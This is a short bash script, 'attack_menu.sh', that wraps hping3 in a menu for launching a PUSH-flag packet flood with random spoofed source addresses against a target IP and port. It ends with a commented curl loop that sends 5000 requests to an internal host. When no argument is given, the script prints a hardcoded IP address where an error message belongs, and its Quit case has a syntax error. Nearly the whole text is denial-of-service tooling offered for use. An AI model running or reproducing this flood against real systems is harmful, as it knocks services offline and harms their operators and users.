#!/usr/bin/bash

# usage: ./attack_menu.sh <IP> <PORT>

hping='/usr/sbin/hping3'


echo "*** ATTACK MENU ***"
echo "******************"
echo ""

IP=$1
if [ "$IP" == "" ]
 then
        echo "185.68.16.111"
        exit
fi

PORT=$2
if [ "$PORT" == "" ]
 then
        echo "Enter Target PORT as an Argument"
        exit
fi

echo "Target: $IP:$PORT"
echo ""
ATTACK='Please chose your attack: '
options="PUSH-Flood"

select opt in "${options[@]}"
do
    case $opt in
  
        "PUSH-Flood")
                cmd="$hping -P -p $PORT $IP --flood --rand-source --tos 33 --ttl 74 -d 54"
		echo "Running: "$cmd
		eval $cmd
                ;;
       
        "Quit"
            break
            ;;
        *) echo invalid option;;
    esac
done
# for i in {1..5000}; do curl -v --header "Host: whatever" http://10.128.10.80/whatever$i; done
